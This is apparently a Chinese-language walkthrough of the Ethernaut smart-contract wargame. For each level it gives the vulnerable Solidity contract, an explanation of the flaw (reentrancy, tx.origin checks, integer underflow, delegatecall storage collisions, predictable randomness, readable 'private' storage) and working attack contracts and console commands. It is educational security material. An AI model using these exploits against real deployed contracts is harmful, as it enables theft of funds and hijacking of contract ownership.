# Hello Ethernaut
根据提示一步步来就好：
```js
await contract.info()
await contract.info1()
await contract.info2()
await contract.infonum()
await contract.info42()
await contract.theMethodname()
await contract.method7123949()
await contract.password()
await contract.authenticate("ethernaut0")
```

# Fallback
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```
目标是获取 owner 并且把 balance 变为 0。合约在部署时，部署者会成为 owner，并且会有 1000 ether 的初始贡献值。
- contribute() 函数允许用户贡献 小于 0.001 ether 的金额，且如果某个地址的贡献值超过当前 owner 的贡献值，该地址将成为新的 owner。
- receive() 函数允许合约接收以太币，并且如果满足条件（即 msg.value > 0 且 contributions[msg.sender] > 0），将当前调用者设为 owner。

要成为 owner，有两种方法：
- 使用 contribute() 函数，将 contributions[msg.sender] 增加到超过当前 owner 的贡献值。
- 使用 receive() 函数，只要有任何贡献，并发送非零金额的以太币即可成为 owner。

前者显然不太现实，因为需要的 ETH 太多。所以考虑利用 receive() 函数，为了利用 receive() 函数，需要先满足 `contributions[msg.sender] > 0` 条件。 所以 POC 如下：
```solidity
await contract.contribute({value: toWei("0.000001")})
await contract.sendTransaction({value: toWei("0.000001")})
await contract.owner() // 此时已经修改成功
await contract.withdraw()
```
看了其他同学的wp发现还有其他方法：
```solidity
await contract.contribute({value: '100'}) // 不带 toWei 直接单位就是 wei
await contract.send('100')                // 不带 toWei 直接单位就是 wei
```

# Fallout
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```
- 在 Solidity 0.6.0 版本之前，构造函数的名称必须与合约的名称相同。在这个合约中，构造函数名称写作 Fal1out，而不是 Fallout，所以它实际上并不是一个构造函数，而是一个普通的函数。
- 由于这个错误，owner 的初始所有者并没有被正确设置，任何人都可以调用这个 Fal1out 函数并成为 owner。
- 当然，题目之外，本题的合约还有一个问题：任何人都可以通过调用 `function sendAllocation(address payable allocator) public` 退还其他人的 allocation。

```solidity
await contract.Fal1out()
```

# Colin Flip
这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```
- 在合约中，blockValue 是通过 blockhash(block.number - 1) 生成的，而 coinFlip 则是blockValue 除以一个常量 FACTOR 得到的结果。因此，coinFlip 的结果是0或1(FACTOR 是一个接近 2^255 的大数。也就是说，blockValue 除以 FACTOR 只可能得到两个值之一：0 或 1)。由于 blockValue 是可预测的（因为 block.number 和 blockhash 在公开区块链上是已知的），所以我们可以计算出 coinFlip 的值，从而预测硬币的结果。
- 编写一个攻击合约来实现这一点，通过攻击合约去调用另一个合约：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    ICoinFlip public victimContract = ICoinFlip(0x611d16eA5Ac341EB3D588C9d4eb3Bf3856311A88);

    function attack() public  {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
  }
}
```
在 remix 部署，然后重复调用 10 次即可。
```js
(await contract.consecutiveWins()).words[0] // 查看状态，到 10 即可。
```
补充：57896044618658097711785492504343953926634992332820282019728792003956564819968=2^255，所以这里除以这个数可以实现0/1区分。

# Telephone
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```
函数 changeOwner 使用了 tx.origin 和 msg.sender 来决定是否更改 owner。这里的漏洞点在于 tx.origin 和 msg.sender 的区别：
- tx.origin 是最初发起交易的外部账户地址。
- msg.sender 是当前调用该函数的地址。

如果直接调用 changeOwner 函数，tx.origin 和 msg.sender 是相等的，所以不会更改 owner。但如果通过一个中间合约来调用 changeOwner，那么 tx.origin 会是你自己，而 msg.sender 会是中间合约的地址，这时 tx.origin != msg.sender，条件满足，就可以更改 owner。解决思路:编写一个中间合约，通过这个合约去调用 Telephone 合约的 changeOwner 函数，从而满足条件，成功更改 owner。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}


contract Attack {
    ITelephone public victimContract = ITelephone(0xDDe7254d07e97ce1f0BCD2BC3C39841cb9C6B960);

    function attack() public {
        victimContract.changeOwner(msg.sender);
    }
}
```

# Token
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```
需求：你最开始有 20 个 token, 如果你通过某种方法可以增加你手中的 token 数量，你就可以通过这一关，当然越多越好
代码分析：
```solidity
mapping(address => uint256) balances;

function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0); // 关键漏洞代码：无符号数减法可能会溢出变成一个极大数
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```
- 在 Solidity 0.8.0 之前，如果进行减法运算的结果小于零，实际上会导致数值从一个非常大的数字开始，而不是抛出错误。
- 攻击步骤：调用 transfer 函数，尝试转账比初始余额更多的 token（如 _value 为 21），这将导致整数下溢。


```solidity
await contract.transfer(contract.address,21)
```

# Delegation

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
这道智能合约题目主要涉及了两个合约 Delegate 和 Delegation，考察了 Solidity 中 delegatecall 的使用及其潜在的安全风险。
- delegatecall 是 Solidity 中的一种特殊调用方式，允许一个合约在另一个合约的上下文（包括存储和地址空间）中执行代码。也就是说，delegatecall 执行的是目标合约（这里是 Delegate）的代码，但所有的状态变量和上下文（包括 msg.sender 和 msg.value）是当前合约（即 Delegation）的。
- 因此，在 Delegation 合约中，如果外部传递的数据与 Delegate 中的 pwn 函数匹配，delegatecall 将会执行 Delegate 中的 pwn 函数，但操作的是 Delegation 合约的存储。换句话说，pwn 函数中的 owner = msg.sender 将会更改 Delegation 合约的 owner，而不是 Delegate 合约的 owner。

使用:[abi encoder](https://emn178.github.io/online-tools/keccak_256.html) 计算 `pwn()` 的 abi signatur（前4个字节）`dd365b8b`；
```js
await contract.sendTransaction({data:'dd365b8b'})
```
此外：
```solidity
if (result) {
            this;
        }
```
这段代码似乎无用？

# Force

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
对于一个空合约，没有收款函数，咋一看好像无法转账。在 Solidity 中，通常合约通过 payable 函数接收资金。然而，Force 合约并没有实现任何 payable 函数，这意味着你不能直接通过调用该合约的函数来转账以使合约余额增加。即使合约本身没有 payable 函数，依然可以通过其他方式向合约发送以太币。例如，利用自毁（selfdestruct）的机制，强制向合约地址发送以太币。selfdestruct 会销毁调用的合约，并将合约的剩余余额转移到指定的地址。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    function attack() public payable {
        selfdestruct(payable(address(0x001EFC76D2c63Bc20C4bA266333c76DE2803c7A1)));
    }
}
```

# Vault
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```
- 目标是让 locked = true。虽然密码被声明为私有变量（private），但在以太坊智能合约中，合约的所有数据都是公开存储在区块链上的，所谓的“私有”只是指无法通过合约的接口直接访问。但我们可以通过区块链浏览器或其他调试工具，读取合约的存储状态，从而找到 password 的真实值。
- 我们知道 password 是一个私有的 bytes32 类型的变量，存储在合约的状态变量中。根据 Solidity 的存储布局规则，password 变量会存储在某个固定的槽位中。使用 `web3.eth.getStorageAt(contractAddress, index)` 可以读取这个值。

```js
await web3.eth.getStorageAt(instance, 1)
// 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
await web3.eth.getStorageAt(instance, 1).then(web3.utils.toAscii)
// A very strong secret password :)
// 补充： 通过 web3.utils.toAscii / web3.utils.toHex 可以转为可见字符或者/bytes
await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
```

# King
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
合约通过发送超过当前 prize 的以太坊成为“国王”（king），而被推翻的国王将获得 prize 的奖励。这是一种类似于庞氏骗局的游戏机制，游戏的设计鼓励参与者不断增加 prize 以争夺国王的位置。
攻击目标是破坏这个合约，即在成为新的国王后，其他人也不能通过发送更高的 prize 夺取国王的位置。并且 submit 时也会尝试夺权，如果夺权失败则通关。
- 合约中的潜在问题在于：当新的国王被推翻时，旧的国王会收到 prize。如果接收 prize 的操作失败，receive() 函数中的流程就会失败，国王位置将不会被更新。因此，可以利用一种方式阻止国王接收 prize，从而阻止其他人替代国王。部署一个智能合约，该合约的 receive() 函数拒绝接受以太坊，从而导致 King 合约在调用 payable(king).transfer() 时失败。

```js
// 查看当前 prize
(await contract.prize()).toNumber()
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable kingContract;

    constructor(address payable _kingContract) payable {
        kingContract = _kingContract;
    }

    function attack() public payable {
        // 向 King 合约发送超过当前 prize 的以太坊，成为国王
        (bool success, ) = kingContract.call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // 通过阻止接收以太坊来破坏 King 合约
    receive() external payable {
        revert("Cannot become king");
    }
}
```

# Re-entrancy

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

这道题是经典的重入漏洞；Reentrance 合约的 withdraw 函数在确保调用者有足够余额后，会将资金发送到调用者的地址。关键是在发送资金和更新余额之间，由于使用 call 方法，合约允许调用者的回退（fallback）方法执行，从而可能再次调用 withdraw 函数。如果回退方法中再次调用 withdraw，并且合约状态尚未更新，这将导致重入攻击。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Attack {
    IReentrance public victimContract = IReentrance(0xFd0d5031eA1e5169a6C080a30069042a10CbC59b);
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    receive() external payable {
        if (address(victimContract).balance >= 0.001 ether) {
            victimContract.withdraw(0.001 ether);
        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
            victimContract.withdraw(address(victimContract).balance);
        }
    }

    function attack() public payable {
        victimContract.donate{value: 0.001 ether}(address(this));
        victimContract.withdraw(0.001 ether);
    }

    function getFunds() public {
       payable(owner).transfer(address(this).balance);
    }
}
```
Attack 的时候传 0.001 ether 即可。

# Elevator

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
目标让 top 变成 true。下面这一段代码看起来是无法满足的，但 building 合约是自己控制的，可以在里面反转 isLastFloor 的返回值，先返回 false 然后返回 true。
```solidity
if (!building.isLastFloor(_floor)) {
    floor = _floor;
    top = building.isLastFloor(floor);
}
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint _floor) external;    
}

contract Attack {
    IElevator public victimContract = IElevator(0xB85c9b8D0499B6D143675FF579755d2dEEaccDEa);
    bool public toggle = true;

    constructor(){}
    
    function isLastFloor(uint256) public returns (bool){
        toggle = !toggle;
        return toggle;
    }

    function attack() public payable {
        victimContract.goTo(1);
    }
}
```

这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。

# Privacy
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {
    bool public locked = true;
    uint256 public ID = block.timestamp;
    uint8 private flattening = 10;
    uint8 private denomination = 255;
    uint16 private awkwardness = uint16(block.timestamp);
    bytes32[3] private data;

    constructor(bytes32[3] memory _data) {
        data = _data;
    }

    function unlock(bytes16 _key) public {
        require(_key == bytes16(data[2]));
        locked = false;
    }

    /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
    */
}
```
目标是解锁这个合约。要解锁合约，我们需要找到一个 bytes16 的 _key，该密钥必须与 data[2] 的前 16 字节相同。也就是说，合约的解锁机制依赖于 data[2] 的内容。
- 在 Solidity 中，状态变量是按顺序存储在合约的存储槽（slots）中的。每个存储槽的大小为 32 字节（256 位）。我们可以利用这一点通过读取合约的存储来获取 data[2] 的内容。以下是 Solidity 中变量的存储规则：
    - 每个 uint256 或 bytes32 类型的变量独占一个存储槽。
    - 较小的数据类型（如 uint8 和 uint16）可以合并存储在同一个槽中，直到占满 32 字节。
- 存储布局分析：根据代码，变量的存储分布如下
    - locked（bool 类型）占用第 0 槽的第 1 位。
    - ID（uint256 类型）占用第 1 槽。
    - flattening, denomination, 和 awkwardness（uint8 和 uint16 类型）会合并到第 2 槽。
    - data[0], data[1], 和 data[2] 分别占用第 3、4、5 槽。
    - 我们需要的是 data[2]，它位于存储槽 5 中。

```js
await web3.eth.getStorageAt("0xCe702b10A17D441216cdA807c7b93E6d787479c6", 5);
// 0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3
"0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3".slice(0,34) // include "0x"
await contract.unlock("0x9a7cc95f3d89c118afdf08eba0a9246c")
await contract.locked()
```
- bytes 类型表示一个定长或变长的字节数组。在 Solidity 中，字节数组从高位（即数组的开头）开始存储。当进行从大类型到小类型的转换时，bytes 是截取前面的字节（即高位部分）。bytes 数组是字节序列，按照大端字节序（big-endian）方式存储。大端表示法意味着最左边的字节是最高有效位，因此在截取时保留的是高位部分。
- uint（无符号整数）类型表示一个数值，在内存中的表示方式是数值的二进制形式。当对 uint 进行类型转换时，Solidity 选择截取数值的低位，因为低位是数值的有效部分。

# Gatekeeper One

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
- `gasLeft()`: [docs](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties)
```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```
这个条件要求 msg.sender 不等于 tx.origin。这意味着你需要通过另一个合约来调用 GatekeeperOne 合约。
```solidity
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
```
这个条件要求在执行该modifier时剩余的gas量必须是 8191 的倍数。这个条件非常棘手，通过循环去不断尝试。
```solidity
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
}
```
`bytes 本身是大端序，如果 bytes 和 uint 进行类型转换，数据本身不会发生变化，但数据的解读方式需要按对方的方式来进行解读。` 这里的要求是构造一个特定的 bytes8 类型的 _gateKey，它需要通过以下三个条件：
- 条件1：uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) 这个条件要求 _gateKey 的低32位的前16位必须为0，以使得低32位的值等于低16位的值。
- 条件2：uint32(uint64(_gateKey)) != uint64(_gateKey) 这个条件要求 _gateKey 的高32位必须不为零。换句话说，整个 _gateKey 必须大于 2^32，从而 uint32(uint64(_gateKey)) 和 uint64(_gateKey) 不相等。
- 条件3：uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) 这个条件要求 _gateKey 的低16位等于 tx.origin（交易发起者地址）的低16位。

综上可以如下构造：
```solidity
bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract GatekeeperOneExploit {
    IGatekeeperOne public gatekeeper = IGatekeeperOne(0x9aA2db5838cBEF21BD6bC21E465B5973e5155b68);

    constructor() {}

    function exploit() public {
        bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
        for (uint256 i = 0; i < 8191; i++) {
            (bool success, ) = address(gatekeeper).call{gas: 8191 * 10 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}
```

# Gatekeeper Two
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
题目相关资料：
- [solidity cheatsheet](https://docs.soliditylang.org/en/v0.4.23/miscellaneous.html#cheatsheet)
- [solidity assembly](https://docs.soliditylang.org/en/v0.4.23/assembly.html)

gateOne 同理，通过代理合约即可。gateTwo 的 extcodesize, 它返回 caller() 的合约代码大小。
```solidity
modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller()) // 内联汇编，caller() 相当于 msg.sender()，extcodesize 用于获取指定地址上存储的合约代码大小
        }
        require(x == 0);
        _;
    }
```
- 要求调用者的合约代码大小为0，意味着在调用这个合约时，调用者合约还没有部署完整。在 Solidity 中，当合约构造函数正在执行时，合约的代码还没有完全部署，extcodesize 会返回0。因此，我们可以在合约的构造函数中完成对 GatekeeperTwo 的调用，绕过这一检查；
- gateThree 看似复杂，但异或其实很简单：`_gateKey = uint64(keccak256(msg.sender)) ^ type(uint64).max`；

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns(bool);
}

contract Attack {
    IGatekeeperTwo public gatekeeper = IGatekeeperTwo(0xFC25F472366970CB5587aE22e4AACFbb02FBc589);

    constructor() {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        gatekeeper.enter(gateKey);
    }
}
```

# Naught Coin
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

contract NaughtCoin is ERC20 {
    // string public constant name = 'NaughtCoin'; // 调用父类构造函数传进去的
    // string public constant symbol = '0x0'; // 调用父类构造函数传进去的
    // uint public constant decimals = 18; // 这里的注释指的是 ERC20 的默认逻辑
    uint256 public timeLock = block.timestamp + 10 * 365 days;
    uint256 public INITIAL_SUPPLY;
    address public player;

    constructor(address _player) ERC20("NaughtCoin", "0x0") {
        player = _player;
        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals())); // decimals() 默认值18，这里是发放 1000000 枚token 的意思
        // _totalSupply = INITIAL_SUPPLY;
        // _balances[player] = INITIAL_SUPPLY;
        _mint(player, INITIAL_SUPPLY); // 实现了上面注释的逻辑
        emit Transfer(address(0), player, INITIAL_SUPPLY);
    }

    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) {
        super.transfer(_to, _value);
    }

    // Prevent the initial owner from transferring tokens until the timelock has passed
    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timeLock);
            _;
        } else {
            _;
        }
    }
}
```
目标是将我的地址余额变为0。由于 transfer 被时间锁限制，我们需要找到一种可以绕过 transfer 函数的方式。这个题需要一些关于 ERC20 的背景知识：
- ERC20 代码: [github](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v4.7/contracts/token/ERC20/ERC20.sol)
- [ERC20-标准源代码-语法导读](https://github.com/SeeDAO-OpenSource/DEV-NoviceVillage/blob/master/1.%E7%BB%BC%E5%90%88%E6%80%A7%E7%90%86%E8%A7%A3/Token/ERC20-%E6%A0%87%E5%87%86%E6%BA%90%E4%BB%A3%E7%A0%81-%E8%AF%AD%E6%B3%95%E5%AF%BC%E8%AF%BB.md)

阅读完上述材料后我们知道，除了 transfer，还有 approve 和 transferFrom。虽然合约限制了 transfer 函数，但并没有限制 approve 和 transferFrom 函数。ERC20 除了直接 transfer 之外，为了可组合性，还实现了授权转账功能。我们可以利用授权转账功能来绕过 token lock。

```js
await contract.approve(player, toWei("1000000"))
await contract.transferFrom(player, instance, toWei("1000000"))
```

# Preservation
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }
    
    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
- 这道题的核心在于利用delegatecall的上下文保留机制，通过调用外部合约代码来操作当前合约的存储布局，从而实现攻击目标。delegatecall 修改的本质上是 Preservation 中的变量。

首先需要理解 Preservation 合约的存储结构：
- timeZone1Library - 存储在 slot 0
- timeZone2Library - 存储在 slot 1
- owner - 存储在 slot 2
- storedTime - 存储在 slot 3

在 LibraryContract 中，只有一个状态变量： storedTime - 存储在 slot 0。setTime 实际上修改的是 address public timeZone1Library。

编写并部署一个恶意合约 MaliciousLibrary，该合约与 LibraryContract 有相同的函数签名 setTime(uint256)，但它将操作 Preservation 合约的存储槽 2（即 owner 变量），并将 owner 替换为攻击者的地址。
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MaliciousLibrary {
    function setTime(uint256) public {
        address attacker = address(uint160(msg.sender));
        assembly {
            sstore(2, attacker) // sstore(slot, value)，使用 sstore 可以绕过 Solidity 对变量访问的限制，例如在没有声明对应的状态变量时直接修改存储槽的值。
        }
    }
}
```

```js
await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7")
await contract.timeZone1Library()
// 0x6b14047235Ae884f97bb15aba68d40D951A2a9F7
await contract.setFirstTime("0x6b14047235Ae884f97bb15aba68d40D951A2a9F7") // 随便传参数反正不会用
await contrcat.owner()
```
